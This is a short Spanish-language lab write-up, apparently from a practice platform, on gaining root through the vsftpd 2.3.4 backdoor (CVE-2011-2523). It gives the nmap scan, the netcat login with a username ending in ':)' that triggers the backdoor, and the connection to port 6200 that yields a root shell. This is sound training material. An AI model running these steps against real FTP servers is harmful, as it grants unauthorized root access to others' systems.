# Tproot

## Descripción

Laboratorio para practicar la explotación del **backdoor de vsftpd 2.3.4 (CVE-2011-2523)** para obtener acceso como **root**.

## Enumeración

Se realiza un escaneo con **Nmap** para identificar los servicios disponibles.

```bash
nmap -sV 172.17.0.2
```

**Resultado:**

```text
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-17 17:30 -0400
Nmap scan report for 172.17.0.2
Host is up (0.0000040s latency).
Not shown: 998 closed tcp ports (reset)

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.3.4
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))

MAC Address: 46:37:6E:C8:32:60 (Unknown)
Service Info: OS: Unix
```

El puerto **21** ejecuta **vsftpd 2.3.4**, una versión vulnerable al backdoor identificado como **CVE-2011-2523**.

## Explotación

Se establece una conexión al servicio FTP y se ingresa un usuario terminado en `:)`, lo que activa el backdoor.

```bash
nc 172.17.0.2 21
```

```text
220 (vsFTPd 2.3.4)
User nacho:)
331 Please specify the password.
PASS 123
```

Una vez activado el backdoor, se abre un servicio en el puerto **6200**.

```bash
nc 172.17.0.2 6200
```

Al conectarse se obtiene una shell con privilegios de **root**.

```text
id
uid=0(root) gid=0(root) groups=0(root)

whoami
root
```

## Conclusión

Este laboratorio demuestra la explotación del backdoor presente en **vsftpd 2.3.4**, que permite obtener acceso como **root** simplemente autenticándose con un nombre de usuario que finalice en `:)` y conectándose posteriormente al puerto **6200**.
